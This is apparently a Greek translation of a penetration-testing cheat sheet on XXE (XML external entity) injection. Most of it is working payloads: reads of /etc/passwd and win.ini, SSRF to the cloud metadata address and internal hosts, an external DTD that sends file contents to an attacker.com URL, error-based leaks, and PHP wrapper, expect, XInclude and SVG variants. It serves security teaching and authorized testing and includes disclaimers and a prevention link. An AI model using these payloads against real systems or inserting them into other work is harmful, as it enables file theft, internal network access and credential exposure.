# 📄 XXE — εισαγωγή εξωτερικών οντοτήτων XML

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇹🇷 Türkçe Sürüm](README.tr.md)

```
  ██╗  ██╗██╗  ██╗███████╗
  ╚██╗██╔╝╚██╗██╔╝██╔════╝
   ╚███╔╝  ╚███╔╝ █████╗  
   ██╔██╗  ██╔██╗ ██╔══╝  
  ██╔╝ ██╗██╔╝ ██╗███████╗
  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
   Εισαγωγή εξωτερικών οντοτήτων XML (XXE)
```

---

## Πριν ξεκινήσετε

Το **XML** είναι μορφή δομημένων δεδομένων. Ένας **parser** το αναλύει, ενώ μια **entity** είναι συμβολική αναφορά που μπορεί να αντικατασταθεί με περιεχόμενο. **DTD** σημαίνει περιγραφή δομής και οντοτήτων XML. Το XXE αφορά μη ασφαλή επεξεργασία εξωτερικών οντοτήτων.

Η δυνατότητα ανάγνωσης αρχείου ή εξωτερικού αιτήματος εξαρτάται από τον parser, τις επιλογές του και τα δικαιώματα της εφαρμογής. Ελέγξτε πρώτα αν το συγκεκριμένο endpoint επεξεργάζεται πραγματικά XML και με ποια λειτουργία.

Οι παρακάτω δοκιμές αφορούν εργαστήρια ή στόχους που περιλαμβάνονται ρητά σε εγκεκριμένο έλεγχο. Οι διευθύνσεις, τα διαπιστευτήρια και τα αναγνωριστικά είναι ενδεικτικά. Οι εντολές και τα payloads διατηρούνται από το αγγλικό πρωτότυπο· δεν εκτελούνται κατά τη μετάφραση.

<a id="section-01"></a>

## 🎯 Τι είναι το XXE

**XXE** αφορά parsers XML που επεξεργάζονται μη ασφαλώς εξωτερικές οντότητες. Ανάλογα με τη ρύθμιση, μπορεί να επιτρέπεται ανάγνωση αρχείων, SSRF ή άλλος αντίκτυπος.

---

<a id="section-02"></a>

## 💉 Βασικά δοκιμαστικά payloads

### Ανάγνωση τοπικών αρχείων
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Αρχεία Windows
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```

### SSRF μέσω XXE
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/">
]>
<root>&xxe;</root>
```

---

<a id="section-03"></a>

## 🔒 Τυφλό XXE με εξωτερική επικοινωνία (OOB)

> **Ελεγχόμενη τεκμηρίωση:** Τα αρχικά δείγματα περιλαμβάνουν ανάγνωση αρχείου και αποστολή περιεχομένου εκτός εφαρμογής. Χρησιμοποιήστε εργαστηριακά δεδομένα ή την ελάχιστη απόδειξη που επιτρέπει ο έλεγχος. Περιορισμοί parser και δικτύου μπορεί να εμποδίζουν την επικοινωνία.


### Εξωτερικό DTD
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

**Το evil.dtd στον ελεγχόμενο εξωτερικό server:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

### Έκθεση δεδομένων μέσω μηνυμάτων σφάλματος
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```

---

<a id="section-04"></a>

## 🛡️ Παραδείγματα παράκαμψης του πρωτοτύπου και περιορισμοί

> **Δεν αρκεί η ετικέτα ή το πρωτόκολλο:** Δήλωση UTF-16 χωρίς αντίστοιχα bytes δεν μετατρέπει το αρχείο. Wrappers PHP, expect και XInclude χρειάζονται συγκεκριμένη υποστήριξη ή ενεργοποίηση. Τα αποσπάσματα του πρωτοτύπου δεν συνδυάζονται αυτόματα σε ένα έγκυρο πλήρες XML. Πηγή: [OWASP — πρόληψη XXE](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html).


### Κωδικοποίηση
```xml
<!-- UTF-16 -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- Κωδικοποίηση Base64 μέσω wrapper PHP -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

### Παραλλαγές πρωτοκόλλων
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "data://text/plain,test">
```

### XInclude
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### XXE σε SVG
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="20">&xxe;</text>
</svg>
```

---

<a id="section-05"></a>

## 📊 Γρήγορη αναφορά

| Είδος δοκιμαστικής εισόδου | Χρήση |
| -------------- | ---------- |
| Ανάγνωση αρχείου | `SYSTEM "file:///etc/passwd"` |
| SSRF | `SYSTEM "http://internal/"` |
| Τυφλός έλεγχος μέσω εξωτερικής επικοινωνίας (OOB) | Εξωτερικό DTD και εξωτερική αποστολή δεδομένων |
| Έγχυση μέσω μηνυμάτων σφάλματος (Error-based) | Πρόκληση σφάλματος που ενδέχεται να περιέχει δεδομένα |

### Endpoints που χρειάζονται έλεγχο
```
- SOAP APIs
- Μεταφορτώσεις αρχείων XML
- Επεξεργασία SVG
- Parsers εγγράφων DOCX και XLSX
- Ροές RSS/Atom
```

---

<a id="section-06"></a>

## 📚 Πηγές

- [PortSwigger — XXE](https://portswigger.net/web-security/xxe)
- [PayloadsAllTheThings — XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

---

<p align="center">
  <b>📄 Ελέγξτε την ασφαλή επεξεργασία XML!</b><br>
  <i>Μόνο για εξουσιοδοτημένους ελέγχους!</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
